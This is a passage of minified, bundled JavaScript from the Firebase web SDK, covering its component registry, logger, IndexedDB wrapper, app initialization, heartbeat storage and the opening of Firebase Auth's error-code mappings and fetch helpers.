    (this.name = e),
      (this.instanceFactory = t),
      (this.type = r),
      (this.multipleInstances = !1),
      (this.serviceProps = {}),
      (this.instantiationMode = "LAZY"),
      (this.onInstanceCreated = null);
  }
  setInstantiationMode(e) {
    return (this.instantiationMode = e), this;
  }
  setMultipleInstances(e) {
    return (this.multipleInstances = e), this;
  }
  setServiceProps(e) {
    return (this.serviceProps = e), this;
  }
  setInstanceCreatedCallback(e) {
    return (this.onInstanceCreated = e), this;
  }
}
const ct = "[DEFAULT]";
class Yl {
  constructor(e, t) {
    (this.name = e),
      (this.container = t),
      (this.component = null),
      (this.instances = new Map()),
      (this.instancesDeferred = new Map()),
      (this.instancesOptions = new Map()),
      (this.onInitCallbacks = new Map());
  }
  get(e) {
    const t = this.normalizeInstanceIdentifier(e);
    if (!this.instancesDeferred.has(t)) {
      const r = new Ol();
      if (
        (this.instancesDeferred.set(t, r),
        this.isInitialized(t) || this.shouldAutoInitialize())
      )
        try {
          const i = this.getOrInitializeService({ instanceIdentifier: t });
          i && r.resolve(i);
        } catch {}
    }
    return this.instancesDeferred.get(t).promise;
  }
  getImmediate(e) {
    var t;
    const r = this.normalizeInstanceIdentifier(
        null == e ? void 0 : e.identifier
      ),
      i = null !== (t = null == e ? void 0 : e.optional) && void 0 !== t && t;
    if (!this.isInitialized(r) && !this.shouldAutoInitialize()) {
      if (i) return null;
      throw Error(`Service ${this.name} is not available`);
    }
    try {
      return this.getOrInitializeService({ instanceIdentifier: r });
    } catch (o) {
      if (i) return null;
      throw o;
    }
  }
  getComponent() {
    return this.component;
  }
  setComponent(e) {
    if (e.name !== this.name)
      throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);
    if (this.component)
      throw Error(`Component for ${this.name} has already been provided`);
    if (((this.component = e), this.shouldAutoInitialize())) {
      if (Xl(e))
        try {
          this.getOrInitializeService({ instanceIdentifier: ct });
        } catch {}
      for (const [t, r] of this.instancesDeferred.entries()) {
        const i = this.normalizeInstanceIdentifier(t);
        try {
          const o = this.getOrInitializeService({ instanceIdentifier: i });
          r.resolve(o);
        } catch {}
      }
    }
  }
  clearInstance(e = ct) {
    this.instancesDeferred.delete(e),
      this.instancesOptions.delete(e),
      this.instances.delete(e);
  }
  async delete() {
    const e = Array.from(this.instances.values());
    await Promise.all([
      ...e.filter((t) => "INTERNAL" in t).map((t) => t.INTERNAL.delete()),
      ...e.filter((t) => "_delete" in t).map((t) => t._delete()),
    ]);
  }
  isComponentSet() {
    return null != this.component;
  }
  isInitialized(e = ct) {
    return this.instances.has(e);
  }
  getOptions(e = ct) {
    return this.instancesOptions.get(e) || {};
  }
  initialize(e = {}) {
    const { options: t = {} } = e,
      r = this.normalizeInstanceIdentifier(e.instanceIdentifier);
    if (this.isInitialized(r))
      throw Error(`${this.name}(${r}) has already been initialized`);
    if (!this.isComponentSet())
      throw Error(`Component ${this.name} has not been registered yet`);
    const i = this.getOrInitializeService({
      instanceIdentifier: r,
      options: t,
    });
    for (const [o, s] of this.instancesDeferred.entries()) {
      r === this.normalizeInstanceIdentifier(o) && s.resolve(i);
    }
    return i;
  }
  onInit(e, t) {
    var r;
    const i = this.normalizeInstanceIdentifier(t),
      o =
        null !== (r = this.onInitCallbacks.get(i)) && void 0 !== r
          ? r
          : new Set();
    o.add(e), this.onInitCallbacks.set(i, o);
    const s = this.instances.get(i);
    return (
      s && e(s, i),
      () => {
        o.delete(e);
      }
    );
  }
  invokeOnInitCallbacks(e, t) {
    const r = this.onInitCallbacks.get(t);
    if (r)
      for (const i of r)
        try {
          i(e, t);
        } catch {}
  }
  getOrInitializeService({ instanceIdentifier: e, options: t = {} }) {
    let r = this.instances.get(e);
    if (
      !r &&
      this.component &&
      ((r = this.component.instanceFactory(this.container, {
        instanceIdentifier: Jl(e),
        options: t,
      })),
      this.instances.set(e, r),
      this.instancesOptions.set(e, t),
      this.invokeOnInitCallbacks(r, e),
      this.component.onInstanceCreated)
    )
      try {
        this.component.onInstanceCreated(this.container, e, r);
      } catch {}
    return r || null;
  }
  normalizeInstanceIdentifier(e = ct) {
    return this.component ? (this.component.multipleInstances ? e : ct) : e;
  }
  shouldAutoInitialize() {
    return !!this.component && "EXPLICIT" !== this.component.instantiationMode;
  }
}
function Jl(n) {
  return n === ct ? void 0 : n;
}
function Xl(n) {
  return "EAGER" === n.instantiationMode;
}
class Zl {
  constructor(e) {
    (this.name = e), (this.providers = new Map());
  }
  addComponent(e) {
    const t = this.getProvider(e.name);
    if (t.isComponentSet())
      throw new Error(
        `Component ${e.name} has already been registered with ${this.name}`
      );
    t.setComponent(e);
  }
  addOrOverwriteComponent(e) {
    this.getProvider(e.name).isComponentSet() && this.providers.delete(e.name),
      this.addComponent(e);
  }
  getProvider(e) {
    if (this.providers.has(e)) return this.providers.get(e);
    const t = new Yl(e, this);
    return this.providers.set(e, t), t;
  }
  getProviders() {
    return Array.from(this.providers.values());
  }
}
var oe;
!(function (n) {
  (n[(n.DEBUG = 0)] = "DEBUG"),
    (n[(n.VERBOSE = 1)] = "VERBOSE"),
    (n[(n.INFO = 2)] = "INFO"),
    (n[(n.WARN = 3)] = "WARN"),
    (n[(n.ERROR = 4)] = "ERROR"),
    (n[(n.SILENT = 5)] = "SILENT");
})(oe || (oe = {}));
const Ql = {
    debug: oe.DEBUG,
    verbose: oe.VERBOSE,
    info: oe.INFO,
    warn: oe.WARN,
    error: oe.ERROR,
    silent: oe.SILENT,
  },
  ec = oe.INFO,
  tc = {
    [oe.DEBUG]: "log",
    [oe.VERBOSE]: "log",
    [oe.INFO]: "info",
    [oe.WARN]: "warn",
    [oe.ERROR]: "error",
  },
  nc = (n, e, ...t) => {
    if (e < n.logLevel) return;
    const r = new Date().toISOString(),
      i = tc[e];
    if (!i)
      throw new Error(
        `Attempted to log a message with an invalid logType (value: ${e})`
      );
    console[i](`[${r}]  ${n.name}:`, ...t);
  };
class wr {
  constructor(e) {
    (this.name = e),
      (this._logLevel = ec),
      (this._logHandler = nc),
      (this._userLogHandler = null);
  }
  get logLevel() {
    return this._logLevel;
  }
  set logLevel(e) {
    if (!(e in oe))
      throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);
    this._logLevel = e;
  }
  setLogLevel(e) {
    this._logLevel = "string" == typeof e ? Ql[e] : e;
  }
  get logHandler() {
    return this._logHandler;
  }
  set logHandler(e) {
    if ("function" != typeof e)
      throw new TypeError("Value assigned to `logHandler` must be a function");
    this._logHandler = e;
  }
  get userLogHandler() {
    return this._userLogHandler;
  }
  set userLogHandler(e) {
    this._userLogHandler = e;
  }
  debug(...e) {
    this._userLogHandler && this._userLogHandler(this, oe.DEBUG, ...e),
      this._logHandler(this, oe.DEBUG, ...e);
  }
  log(...e) {
    this._userLogHandler && this._userLogHandler(this, oe.VERBOSE, ...e),
      this._logHandler(this, oe.VERBOSE, ...e);
  }
  info(...e) {
    this._userLogHandler && this._userLogHandler(this, oe.INFO, ...e),
      this._logHandler(this, oe.INFO, ...e);
  }
  warn(...e) {
    this._userLogHandler && this._userLogHandler(this, oe.WARN, ...e),
      this._logHandler(this, oe.WARN, ...e);
  }
  error(...e) {
    this._userLogHandler && this._userLogHandler(this, oe.ERROR, ...e),
      this._logHandler(this, oe.ERROR, ...e);
  }
}
const rc = (n, e) => e.some((t) => n instanceof t);
let ei, ti;
function ic() {
  return (
    ei ||
    (ei = [IDBDatabase, IDBObjectStore, IDBIndex, IDBCursor, IDBTransaction])
  );
}
function oc() {
  return (
    ti ||
    (ti = [
      IDBCursor.prototype.advance,
      IDBCursor.prototype.continue,
      IDBCursor.prototype.continuePrimaryKey,
    ])
  );
}
const Hs = new WeakMap(),
  or = new WeakMap(),
  js = new WeakMap(),
  Vn = new WeakMap(),
  _r = new WeakMap();
function sc(n) {
  const e = new Promise((t, r) => {
    const i = () => {
        n.removeEventListener("success", o), n.removeEventListener("error", s);
      },
      o = () => {
        t(rt(n.result)), i();
      },
      s = () => {
        r(n.error), i();
      };
    n.addEventListener("success", o), n.addEventListener("error", s);
  });
  return (
    e
      .then((t) => {
        t instanceof IDBCursor && Hs.set(t, n);
      })
      .catch(() => {}),
    _r.set(e, n),
    e
  );
}
function ac(n) {
  if (or.has(n)) return;
  const e = new Promise((t, r) => {
    const i = () => {
        n.removeEventListener("complete", o),
          n.removeEventListener("error", s),
          n.removeEventListener("abort", s);
      },
      o = () => {
        t(), i();
      },
      s = () => {
        r(n.error || new DOMException("AbortError", "AbortError")), i();
      };
    n.addEventListener("complete", o),
      n.addEventListener("error", s),
      n.addEventListener("abort", s);
  });
  or.set(n, e);
}
let sr = {
  get(n, e, t) {
    if (n instanceof IDBTransaction) {
      if ("done" === e) return or.get(n);
      if ("objectStoreNames" === e) return n.objectStoreNames || js.get(n);
      if ("store" === e)
        return t.objectStoreNames[1]
          ? void 0
          : t.objectStore(t.objectStoreNames[0]);
    }
    return rt(n[e]);
  },
  set: (n, e, t) => ((n[e] = t), !0),
  has: (n, e) =>
    (n instanceof IDBTransaction && ("done" === e || "store" === e)) || e in n,
};
function lc(n) {
  sr = n(sr);
}
function cc(n) {
  return n !== IDBDatabase.prototype.transaction ||
    "objectStoreNames" in IDBTransaction.prototype
    ? oc().includes(n)
      ? function (...e) {
          return n.apply($n(this), e), rt(Hs.get(this));
        }
      : function (...e) {
          return rt(n.apply($n(this), e));
        }
    : function (e, ...t) {
        const r = n.call($n(this), e, ...t);
        return js.set(r, e.sort ? e.sort() : [e]), rt(r);
      };
}
function uc(n) {
  return "function" == typeof n
    ? cc(n)
    : (n instanceof IDBTransaction && ac(n),
      rc(n, ic()) ? new Proxy(n, sr) : n);
}
function rt(n) {
  if (n instanceof IDBRequest) return sc(n);
  if (Vn.has(n)) return Vn.get(n);
  const e = uc(n);
  return e !== n && (Vn.set(n, e), _r.set(e, n)), e;
}
const $n = (n) => _r.get(n);
function zs(n, e, { blocked: t, upgrade: r, blocking: i, terminated: o } = {}) {
  const s = indexedDB.open(n, e),
    a = rt(s);
  return (
    r &&
      s.addEventListener("upgradeneeded", (l) => {
        r(rt(s.result), l.oldVersion, l.newVersion, rt(s.transaction), l);
      }),
    t && s.addEventListener("blocked", (l) => t(l.oldVersion, l.newVersion, l)),
    a
      .then((l) => {
        o && l.addEventListener("close", () => o()),
          i &&
            l.addEventListener("versionchange", (c) =>
              i(c.oldVersion, c.newVersion, c)
            );
      })
      .catch(() => {}),
    a
  );
}
const dc = ["get", "getKey", "getAll", "getAllKeys", "count"],
  fc = ["put", "add", "delete", "clear"],
  qn = new Map();
function ni(n, e) {
  if (!(n instanceof IDBDatabase) || e in n || "string" != typeof e) return;
  if (qn.get(e)) return qn.get(e);
  const t = e.replace(/FromIndex$/, ""),
    r = e !== t,
    i = fc.includes(t);
  if (
    !(t in (r ? IDBIndex : IDBObjectStore).prototype) ||
    (!i && !dc.includes(t))
  )
    return;
  const o = async function (s, ...a) {
    const l = this.transaction(s, i ? "readwrite" : "readonly");
    let c = l.store;
    return (
      r && (c = c.index(a.shift())),
      (await Promise.all([c[t](...a), i && l.done]))[0]
    );
  };
  return qn.set(e, o), o;
}
lc((n) => ({
  ...n,
  get: (e, t, r) => ni(e, t) || n.get(e, t, r),
  has: (e, t) => !!ni(e, t) || n.has(e, t),
}));
class pc {
  constructor(e) {
    this.container = e;
  }
  getPlatformInfoString() {
    return this.container
      .getProviders()
      .map((t) => {
        if (hc(t)) {
          const r = t.getImmediate();
          return `${r.library}/${r.version}`;
        }
        return null;
      })
      .filter((t) => t)
      .join(" ");
  }
}
function hc(n) {
  const e = n.getComponent();
  return "VERSION" === (null == e ? void 0 : e.type);
}
const ar = "@firebase/app",
  ri = "0.10.3",
  pt = new wr("@firebase/app"),
  mc = "@firebase/app-compat",
  gc = "@firebase/analytics-compat",
  bc = "@firebase/analytics",
  wc = "@firebase/app-check-compat",
  _c = "@firebase/app-check",
  yc = "@firebase/auth",
  vc = "@firebase/auth-compat",
  kc = "@firebase/database",
  Ic = "@firebase/database-compat",
  Ec = "@firebase/functions",
  Tc = "@firebase/functions-compat",
  Sc = "@firebase/installations",
  Cc = "@firebase/installations-compat",
  Ac = "@firebase/messaging",
  Rc = "@firebase/messaging-compat",
  Pc = "@firebase/performance",
  xc = "@firebase/performance-compat",
  Oc = "@firebase/remote-config",
  Lc = "@firebase/remote-config-compat",
  Nc = "@firebase/storage",
  Mc = "@firebase/storage-compat",
  Dc = "@firebase/firestore",
  Uc = "@firebase/vertexai-preview",
  Fc = "@firebase/firestore-compat",
  Hc = "firebase",
  jc = "10.12.0",
  wn = "[DEFAULT]",
  zc = {
    [ar]: "fire-core",
    [mc]: "fire-core-compat",
    [bc]: "fire-analytics",
    [gc]: "fire-analytics-compat",
    [_c]: "fire-app-check",
    [wc]: "fire-app-check-compat",
    [yc]: "fire-auth",
    [vc]: "fire-auth-compat",
    [kc]: "fire-rtdb",
    [Ic]: "fire-rtdb-compat",
    [Ec]: "fire-fn",
    [Tc]: "fire-fn-compat",
    [Sc]: "fire-iid",
    [Cc]: "fire-iid-compat",
    [Ac]: "fire-fcm",
    [Rc]: "fire-fcm-compat",
    [Pc]: "fire-perf",
    [xc]: "fire-perf-compat",
    [Oc]: "fire-rc",
    [Lc]: "fire-rc-compat",
    [Nc]: "fire-gcs",
    [Mc]: "fire-gcs-compat",
    [Dc]: "fire-fst",
    [Fc]: "fire-fst-compat",
    [Uc]: "fire-vertex",
    "fire-js": "fire-js",
    [Hc]: "fire-js-all",
  },
  _n = new Map(),
  Bc = new Map(),
  lr = new Map();
function ii(n, e) {
  try {
    n.container.addComponent(e);
  } catch (t) {
    pt.debug(
      `Component ${e.name} failed to register with FirebaseApp ${n.name}`,
      t
    );
  }
}
function Ke(n) {
  const e = n.name;
  if (lr.has(e))
    return (
      pt.debug(`There were multiple attempts to register component ${e}.`), !1
    );
  lr.set(e, n);
  for (const t of _n.values()) ii(t, n);
  for (const t of Bc.values()) ii(t, n);
  return !0;
}
function Nt(n, e) {
  const t = n.container.getProvider("heartbeat").getImmediate({ optional: !0 });
  return t && t.triggerHeartbeat(), n.container.getProvider(e);
}
function Gg(n, e, t = wn) {
  Nt(n, e).clearInstance(t);
}
function De(n) {
  return void 0 !== n.settings;
}
const Vc = {
    "no-app":
      "No Firebase App '{$appName}' has been created - call initializeApp() first",
    "bad-app-name": "Illegal App name: '{$appName}'",
    "duplicate-app":
      "Firebase App named '{$appName}' already exists with different options or config",
    "app-deleted": "Firebase App named '{$appName}' already deleted",
    "server-app-deleted": "Firebase Server App has been deleted",
    "no-options":
      "Need to provide options, when not being deployed to hosting via source.",
    "invalid-app-argument":
      "firebase.{$appName}() takes either no argument or a Firebase App instance.",
    "invalid-log-argument":
      "First argument to `onLog` must be null or a function.",
    "idb-open":
      "Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.",
    "idb-get":
      "Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.",
    "idb-set":
      "Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.",
    "idb-delete":
      "Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.",
    "finalization-registry-not-supported":
      "FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.",
    "invalid-server-app-environment":
      "FirebaseServerApp is not for use in browser environments.",
  },
  it = new wt("app", "Firebase", Vc);
class $c {
  constructor(e, t, r) {
    (this._isDeleted = !1),
      (this._options = Object.assign({}, e)),
      (this._config = Object.assign({}, t)),
      (this._name = t.name),
      (this._automaticDataCollectionEnabled = t.automaticDataCollectionEnabled),
      (this._container = r),
      this.container.addComponent(new He("app", () => this, "PUBLIC"));
  }
  get automaticDataCollectionEnabled() {
    return this.checkDestroyed(), this._automaticDataCollectionEnabled;
  }
  set automaticDataCollectionEnabled(e) {
    this.checkDestroyed(), (this._automaticDataCollectionEnabled = e);
  }
  get name() {
    return this.checkDestroyed(), this._name;
  }
  get options() {
    return this.checkDestroyed(), this._options;
  }
  get config() {
    return this.checkDestroyed(), this._config;
  }
  get container() {
    return this._container;
  }
  get isDeleted() {
    return this._isDeleted;
  }
  set isDeleted(e) {
    this._isDeleted = e;
  }
  checkDestroyed() {
    if (this.isDeleted) throw it.create("app-deleted", { appName: this._name });
  }
}
const tn = jc;
function Bs(n, e = {}) {
  let t = n;
  "object" != typeof e && (e = { name: e });
  const r = Object.assign({ name: wn, automaticDataCollectionEnabled: !1 }, e),
    i = r.name;
  if ("string" != typeof i || !i)
    throw it.create("bad-app-name", { appName: String(i) });
  if ((t || (t = Ns()), !t)) throw it.create("no-options");
  const o = _n.get(i);
  if (o) {
    if (Kt(t, o.options) && Kt(r, o.config)) return o;
    throw it.create("duplicate-app", { appName: i });
  }
  const s = new Zl(i);
  for (const l of lr.values()) s.addComponent(l);
  const a = new $c(t, r, s);
  return _n.set(i, a), a;
}
function qc(n = wn) {
  const e = _n.get(n);
  if (!e && n === wn && Ns()) return Bs();
  if (!e) throw it.create("no-app", { appName: n });
  return e;
}
function Ue(n, e, t) {
  var r;
  let i = null !== (r = zc[n]) && void 0 !== r ? r : n;
  t && (i += `-${t}`);
  const o = i.match(/\s|\//),
    s = e.match(/\s|\//);
  if (o || s) {
    const a = [`Unable to register library "${i}" with version "${e}":`];
    return (
      o &&
        a.push(
          `library name "${i}" contains illegal characters (whitespace or "/")`
        ),
      o && s && a.push("and"),
      s &&
        a.push(
          `version name "${e}" contains illegal characters (whitespace or "/")`
        ),
      void pt.warn(a.join(" "))
    );
  }
  Ke(new He(`${i}-version`, () => ({ library: i, version: e }), "VERSION"));
}
const Wc = "firebase-heartbeat-database",
  Gc = 1,
  Yt = "firebase-heartbeat-store";
let Wn = null;
function Vs() {
  return (
    Wn ||
      (Wn = zs(Wc, Gc, {
        upgrade: (n, e) => {
          if (0 === e)
            try {
              n.createObjectStore(Yt);
            } catch (t) {
              console.warn(t);
            }
        },
      }).catch((n) => {
        throw it.create("idb-open", { originalErrorMessage: n.message });
      })),
    Wn
  );
}
async function Kc(n) {
  try {
    const t = (await Vs()).transaction(Yt),
      r = await t.objectStore(Yt).get($s(n));
    return await t.done, r;
  } catch (e) {
    if (e instanceof ze) pt.warn(e.message);
    else {
      const t = it.create("idb-get", {
        originalErrorMessage: null == e ? void 0 : e.message,
      });
      pt.warn(t.message);
    }
  }
}
async function oi(n, e) {
  try {
    const r = (await Vs()).transaction(Yt, "readwrite");
    await r.objectStore(Yt).put(e, $s(n)), await r.done;
  } catch (t) {
    if (t instanceof ze) pt.warn(t.message);
    else {
      const r = it.create("idb-set", {
        originalErrorMessage: null == t ? void 0 : t.message,
      });
      pt.warn(r.message);
    }
  }
}
function $s(n) {
  return `${n.name}!${n.options.appId}`;
}
const Yc = 1024,
  Jc = 2592e6;
class Xc {
  constructor(e) {
    (this.container = e), (this._heartbeatsCache = null);
    const t = this.container.getProvider("app").getImmediate();
    (this._storage = new Qc(t)),
      (this._heartbeatsCachePromise = this._storage
        .read()
        .then((r) => ((this._heartbeatsCache = r), r)));
  }
  async triggerHeartbeat() {
    var e, t;
    const i = this.container
        .getProvider("platform-logger")
        .getImmediate()
        .getPlatformInfoString(),
      o = si();
    if (
      (null !=
        (null === (e = this._heartbeatsCache) || void 0 === e
          ? void 0
          : e.heartbeats) ||
        ((this._heartbeatsCache = await this._heartbeatsCachePromise),
        null !=
          (null === (t = this._heartbeatsCache) || void 0 === t
            ? void 0
            : t.heartbeats))) &&
      this._heartbeatsCache.lastSentHeartbeatDate !== o &&
      !this._heartbeatsCache.heartbeats.some((s) => s.date === o)
    )
      return (
        this._heartbeatsCache.heartbeats.push({ date: o, agent: i }),
        (this._heartbeatsCache.heartbeats =
          this._heartbeatsCache.heartbeats.filter((s) => {
            const a = new Date(s.date).valueOf();
            return Date.now() - a <= Jc;
          })),
        this._storage.overwrite(this._heartbeatsCache)
      );
  }
  async getHeartbeatsHeader() {
    var e;
    if (
      (null === this._heartbeatsCache && (await this._heartbeatsCachePromise),
      null ==
        (null === (e = this._heartbeatsCache) || void 0 === e
          ? void 0
          : e.heartbeats) || 0 === this._heartbeatsCache.heartbeats.length)
    )
      return "";
    const t = si(),
      { heartbeatsToSend: r, unsentEntries: i } = Zc(
        this._heartbeatsCache.heartbeats
      ),
      o = bn(JSON.stringify({ version: 2, heartbeats: r }));
    return (
      (this._heartbeatsCache.lastSentHeartbeatDate = t),
      i.length > 0
        ? ((this._heartbeatsCache.heartbeats = i),
          await this._storage.overwrite(this._heartbeatsCache))
        : ((this._heartbeatsCache.heartbeats = []),
          this._storage.overwrite(this._heartbeatsCache)),
      o
    );
  }
}
function si() {
  return new Date().toISOString().substring(0, 10);
}
function Zc(n, e = Yc) {
  const t = [];
  let r = n.slice();
  for (const i of n) {
    const o = t.find((s) => s.agent === i.agent);
    if (o) {
      if ((o.dates.push(i.date), ai(t) > e)) {
        o.dates.pop();
        break;
      }
    } else if ((t.push({ agent: i.agent, dates: [i.date] }), ai(t) > e)) {
      t.pop();
      break;
    }
    r = r.slice(1);
  }
  return { heartbeatsToSend: t, unsentEntries: r };
}
class Qc {
  constructor(e) {
    (this.app = e),
      (this._canUseIndexedDBPromise = this.runIndexedDBEnvironmentCheck());
  }
  async runIndexedDBEnvironmentCheck() {
    return (
      !!Us() &&
      Fs()
        .then(() => !0)
        .catch(() => !1)
    );
  }
  async read() {
    if (await this._canUseIndexedDBPromise) {
      const t = await Kc(this.app);
      return null != t && t.heartbeats ? t : { heartbeats: [] };
    }
    return { heartbeats: [] };
  }
  async overwrite(e) {
    var t;
    if (await this._canUseIndexedDBPromise) {
      const i = await this.read();
      return oi(this.app, {
        lastSentHeartbeatDate:
          null !== (t = e.lastSentHeartbeatDate) && void 0 !== t
            ? t
            : i.lastSentHeartbeatDate,
        heartbeats: e.heartbeats,
      });
    }
  }
  async add(e) {
    var t;
    if (await this._canUseIndexedDBPromise) {
      const i = await this.read();
      return oi(this.app, {
        lastSentHeartbeatDate:
          null !== (t = e.lastSentHeartbeatDate) && void 0 !== t
            ? t
            : i.lastSentHeartbeatDate,
        heartbeats: [...i.heartbeats, ...e.heartbeats],
      });
    }
  }
}
function ai(n) {
  return bn(JSON.stringify({ version: 2, heartbeats: n })).length;
}
function eu(n) {
  Ke(new He("platform-logger", (e) => new pc(e), "PRIVATE")),
    Ke(new He("heartbeat", (e) => new Xc(e), "PRIVATE")),
    Ue(ar, ri, n),
    Ue(ar, ri, "esm2017"),
    Ue("fire-js", "");
}
eu("");
var tu = "firebase",
  nu = "10.12.0";
function yr(n, e) {
  var t = {};
  for (var r in n)
    Object.prototype.hasOwnProperty.call(n, r) &&
      e.indexOf(r) < 0 &&
      (t[r] = n[r]);
  if (null != n && "function" == typeof Object.getOwnPropertySymbols) {
    var i = 0;
    for (r = Object.getOwnPropertySymbols(n); i < r.length; i++)
      e.indexOf(r[i]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(n, r[i]) &&
        (t[r[i]] = n[r[i]]);
  }
  return t;
}
function qs() {
  return {
    "dependent-sdk-initialized-before-auth":
      "Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK.",
  };
}
Ue(tu, nu, "app");
const ru = qs,
  Ws = new wt("auth", "Firebase", qs()),
  yn = new wr("@firebase/auth");
function iu(n, ...e) {
  yn.logLevel <= oe.WARN && yn.warn(`Auth (${tn}): ${n}`, ...e);
}
function pn(n, ...e) {
  yn.logLevel <= oe.ERROR && yn.error(`Auth (${tn}): ${n}`, ...e);
}
function Pe(n, ...e) {
  throw kr(n, ...e);
}
function Oe(n, ...e) {
  return kr(n, ...e);
}
function vr(n, e, t) {
  const r = Object.assign(Object.assign({}, ru()), { [e]: t });
  return new wt("auth", "Firebase", r).create(e, { appName: n.name });
}
function ot(n) {
  return vr(
    n,
    "operation-not-supported-in-this-environment",
    "Operations that alter the current user are not supported in conjunction with FirebaseServerApp"
  );
}
function ou(n, e, t) {
  if (!(e instanceof t))
    throw (
      (t.name !== e.constructor.name && Pe(n, "argument-error"),
      vr(
        n,
        "argument-error",
        `Type of ${e.constructor.name} does not match expected instance.Did you pass a reference from a different Auth SDK?`
      ))
    );
}
function kr(n, ...e) {
  if ("string" != typeof n) {
    const t = e[0],
      r = [...e.slice(1)];
    return r[0] && (r[0].appName = n.name), n._errorFactory.create(t, ...r);
  }
  return Ws.create(n, ...e);
}
function F(n, e, ...t) {
  if (!n) throw kr(e, ...t);
}
function qe(n) {
  const e = "INTERNAL ASSERTION FAILED: " + n;
  throw (pn(e), new Error(e));
}
function Ye(n, e) {
  n || qe(e);
}
function vn() {
  var n;
  return (
    (typeof self < "u" &&
      (null === (n = self.location) || void 0 === n ? void 0 : n.href)) ||
    ""
  );
}
function su() {
  return "http:" === li() || "https:" === li();
}
function li() {
  var n;
  return (
    (typeof self < "u" &&
      (null === (n = self.location) || void 0 === n ? void 0 : n.protocol)) ||
    null
  );
}
function au() {
  return (
    !(
      typeof navigator < "u" &&
      navigator &&
      "onLine" in navigator &&
      "boolean" == typeof navigator.onLine &&
      (su() || Ds() || "connection" in navigator)
    ) || navigator.onLine
  );
}
function lu() {
  if (typeof navigator > "u") return null;
  const n = navigator;
  return (n.languages && n.languages[0]) || n.language || null;
}
class nn {
  constructor(e, t) {
    (this.shortDelay = e),
      (this.longDelay = t),
      Ye(t > e, "Short delay should be less than long delay!"),
      (this.isMobile = Ll() || Ml());
  }
  get() {
    return au()
      ? this.isMobile
        ? this.longDelay
        : this.shortDelay
      : Math.min(5e3, this.shortDelay);
  }
}
function Ir(n, e) {
  Ye(n.emulator, "Emulator should always be set here");
  const { url: t } = n.emulator;
  return e ? `${t}${e.startsWith("/") ? e.slice(1) : e}` : t;
}
class Gs {
  static initialize(e, t, r) {
    (this.fetchImpl = e),
      t && (this.headersImpl = t),
      r && (this.responseImpl = r);
  }
  static fetch() {
    return this.fetchImpl
      ? this.fetchImpl
      : typeof self < "u" && "fetch" in self
      ? self.fetch
      : typeof globalThis < "u" && globalThis.fetch
      ? globalThis.fetch
      : typeof fetch < "u"
      ? fetch
      : void qe(
          "Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill"
        );
  }
  static headers() {
    return this.headersImpl
      ? this.headersImpl
      : typeof self < "u" && "Headers" in self
      ? self.Headers
      : typeof globalThis < "u" && globalThis.Headers
      ? globalThis.Headers
      : typeof Headers < "u"
      ? Headers
      : void qe(
          "Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill"
        );
  }
  static response() {
    return this.responseImpl
      ? this.responseImpl
      : typeof self < "u" && "Response" in self
      ? self.Response
      : typeof globalThis < "u" && globalThis.Response
      ? globalThis.Response
      : typeof Response < "u"
      ? Response
      : void qe(
          "Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill"
        );
  }
}
const cu = {
    CREDENTIAL_MISMATCH: "custom-token-mismatch",
    MISSING_CUSTOM_TOKEN: "internal-error",
    INVALID_IDENTIFIER: "invalid-email",
    MISSING_CONTINUE_URI: "internal-error",
    INVALID_PASSWORD: "wrong-password",
    MISSING_PASSWORD: "missing-password",
    INVALID_LOGIN_CREDENTIALS: "invalid-credential",
    EMAIL_EXISTS: "email-already-in-use",
    PASSWORD_LOGIN_DISABLED: "operation-not-allowed",
    INVALID_IDP_RESPONSE: "invalid-credential",
    INVALID_PENDING_TOKEN: "invalid-credential",
    FEDERATED_USER_ID_ALREADY_LINKED: "credential-already-in-use",
    MISSING_REQ_TYPE: "internal-error",
    EMAIL_NOT_FOUND: "user-not-found",
    RESET_PASSWORD_EXCEED_LIMIT: "too-many-requests",
    EXPIRED_OOB_CODE: "expired-action-code",
    INVALID_OOB_CODE: "invalid-action-code",
    MISSING_OOB_CODE: "internal-error",
    CREDENTIAL_TOO_OLD_LOGIN_AGAIN: "requires-recent-login",
    INVALID_ID_TOKEN: "invalid-user-token",
    TOKEN_EXPIRED: "user-token-expired",
    USER_NOT_FOUND: "user-token-expired",
    TOO_MANY_ATTEMPTS_TRY_LATER: "too-many-requests",
    PASSWORD_DOES_NOT_MEET_REQUIREMENTS: "password-does-not-meet-requirements",
    INVALID_CODE: "invalid-verification-code",
    INVALID_SESSION_INFO: "invalid-verification-id",
    INVALID_TEMPORARY_PROOF: "invalid-credential",
    MISSING_SESSION_INFO: "missing-verification-id",
    SESSION_EXPIRED: "code-expired",
    MISSING_ANDROID_PACKAGE_NAME: "missing-android-pkg-name",
    UNAUTHORIZED_DOMAIN: "unauthorized-continue-uri",
    INVALID_OAUTH_CLIENT_ID: "invalid-oauth-client-id",
    ADMIN_ONLY_OPERATION: "admin-restricted-operation",
    INVALID_MFA_PENDING_CREDENTIAL: "invalid-multi-factor-session",
    MFA_ENROLLMENT_NOT_FOUND: "multi-factor-info-not-found",
    MISSING_MFA_ENROLLMENT_ID: "missing-multi-factor-info",
    MISSING_MFA_PENDING_CREDENTIAL: "missing-multi-factor-session",
    SECOND_FACTOR_EXISTS: "second-factor-already-in-use",
    SECOND_FACTOR_LIMIT_EXCEEDED: "maximum-second-factor-count-exceeded",
    BLOCKING_FUNCTION_ERROR_RESPONSE: "internal-error",
    RECAPTCHA_NOT_ENABLED: "recaptcha-not-enabled",
    MISSING_RECAPTCHA_TOKEN: "missing-recaptcha-token",
    INVALID_RECAPTCHA_TOKEN: "invalid-recaptcha-token",
    INVALID_RECAPTCHA_ACTION: "invalid-recaptcha-action",
    MISSING_CLIENT_TYPE: "missing-client-type",
    MISSING_RECAPTCHA_VERSION: "missing-recaptcha-version",
    INVALID_RECAPTCHA_VERSION: "invalid-recaptcha-version",
    INVALID_REQ_TYPE: "invalid-req-type",
  },
  uu = new nn(3e4, 6e4);
function lt(n, e) {
  return n.tenantId && !e.tenantId
